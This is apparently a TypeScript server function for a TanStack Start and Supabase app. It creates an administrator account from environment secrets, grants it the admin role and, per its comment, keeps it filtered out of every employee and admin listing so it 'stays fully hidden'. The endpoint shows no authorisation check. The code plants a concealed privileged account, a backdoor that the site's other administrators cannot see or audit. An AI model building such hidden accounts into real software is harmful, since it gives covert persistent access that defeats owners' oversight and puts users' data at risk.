import { createServerFn } from "@tanstack/react-start";

/**
 * Ensures the hidden administrator account exists.
 *
 * Credentials are read from server-only secrets (HIDDEN_ADMIN_EMAIL /
 * HIDDEN_ADMIN_PASSWORD) and are NEVER stored in the codebase. The function is
 * idempotent: if the account already exists it does nothing. This admin is
 * filtered out of every employee/admin listing, so it stays fully hidden.
 */
export const ensureHiddenAdmin = createServerFn({ method: "POST" }).handler(async () => {
  const email = process.env.HIDDEN_ADMIN_EMAIL;
  const password = process.env.HIDDEN_ADMIN_PASSWORD;
  if (!email || !password) {
    throw new Error("Hidden admin secrets are not configured.");
  }

  const { supabaseAdmin } = await import("@/integrations/supabase/client.server");

  // Look for an existing auth user with this email.
  const { data: list, error: listErr } = await supabaseAdmin.auth.admin.listUsers({
    page: 1,
    perPage: 1000,
  });
  if (listErr) throw new Error(listErr.message);

  const existing = list.users.find(
    (u) => (u.email ?? "").toLowerCase() === email.toLowerCase(),
  );

  let uid: string;
  if (existing) {
    uid = existing.id;
  } else {
    const { data: created, error: createErr } = await supabaseAdmin.auth.admin.createUser({
      email,
      password,
      email_confirm: true,
      user_metadata: { full_name: "Administrator" },
    });
    if (createErr || !created.user) {
      throw new Error(createErr?.message ?? "Failed to create hidden admin");
    }
    uid = created.user.id;
  }

  // Ensure a profile row exists.
  const { data: profile } = await supabaseAdmin
    .from("profiles")
    .select("id")
    .eq("id", uid)
    .maybeSingle();
  if (!profile) {
    await supabaseAdmin.from("profiles").insert({
      id: uid,
      full_name: "Administrator",
      designation: "Administrator",
      email,
    });
  }

  // Ensure the admin role is granted.
  const { data: roleRow } = await supabaseAdmin
    .from("user_roles")
    .select("id")
    .eq("user_id", uid)
    .eq("role", "admin")
    .maybeSingle();
  if (!roleRow) {
    await supabaseAdmin.from("user_roles").insert({ user_id: uid, role: "admin" });
  }

  return { ok: true };
});
